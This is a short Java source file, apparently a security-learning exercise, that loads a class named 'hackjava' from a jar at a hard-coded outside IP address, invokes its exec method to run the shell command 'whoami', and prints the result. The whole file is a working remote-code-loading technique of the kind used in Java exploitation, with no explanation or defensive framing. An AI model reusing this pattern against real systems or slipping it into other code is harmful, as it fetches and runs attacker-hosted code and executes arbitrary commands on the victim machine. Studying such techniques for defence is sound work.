package com.sec.cwm;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
public class testurlclassloader {
    public static void main(String arg[]){
        try{
            URL url=new URL("http://124.222.182.202:8888/cmd.jar");
            URLClassLoader ucl = new URLClassLoader(new URL[]{url});
            String cmd="whoami";
            Class cmdClass=ucl.loadClass("com.sec.cwm.hackjava");
            Process p=(Process) cmdClass.getMethod("exec",String.class).invoke(null,cmd);
            InputStream in= p.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[]                b    = new byte[1024];
            int                   a    = -1;
            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }
            System.out.println(baos);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
